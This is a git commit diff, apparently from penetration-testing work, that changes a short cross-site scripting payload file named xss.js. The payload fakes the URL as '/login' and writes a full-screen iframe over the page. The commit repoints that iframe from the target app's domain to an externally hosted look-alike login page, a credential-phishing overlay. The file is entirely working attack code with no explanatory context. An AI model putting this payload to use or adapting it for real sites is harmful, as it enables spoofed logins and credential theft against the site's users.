5bc7d0cb2e3303c47fa0f6ef56a907613c2a1af2
Alesya Huzik <mail@alesya.me>
2025-11-11 13:53:52 +1100

    pentesting 2

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
 alert(document.domain)
 history.replaceState({ edited: false }, '', '/login');
-document.write('<iframe style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vw;" src="https://dev1-app.audiencerepublic.com"/>')
+document.write('<iframe style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vw;" src="https://aguzik.net/ar-login.html"/>')
 //history.replaceState({ edited: true }, '', '/login');
